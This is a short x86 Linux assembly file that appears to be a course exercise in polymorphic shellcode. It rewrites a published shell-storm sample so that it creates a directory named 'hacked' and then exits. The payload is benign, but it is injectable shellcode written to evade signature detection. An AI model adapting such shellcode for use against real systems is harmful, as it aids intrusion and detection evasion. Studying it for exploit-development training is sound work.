; A6 - Polymorphic Shellcode
; William Moody
; 31.12.2021
; PA-26540
; Original: http://shell-storm.org/shellcode/files/shellcode-542.php

global _start
section .text
_start:
	xor eax, eax			; EAX = 0

	push word ax			; "\x00\x00"
	push word 0x6465		; "de"
	push dword 0x6b636168	; "kcah"
	
	mov ebx, esp			; EBX => const char *pathname = "hacked\x00"
	mov al, 0x27			; EAX = 0x27 (SYS_MKDIR)
	mov cx, 0x1ed			; ECX => mode_t mode = 0x1ED (0755 aka. rwxr-xr-x)
	
	int 0x80				; int mkdir(const char *pathname, mode_t mode)

	;;; === === === === === === === ===

	mov al, 0x1				; EAX = 0x1 (SYS_EXIT)
	xor ebx, ebx			; EBX => int status = 0

	int 0x80				; int exit(int status);
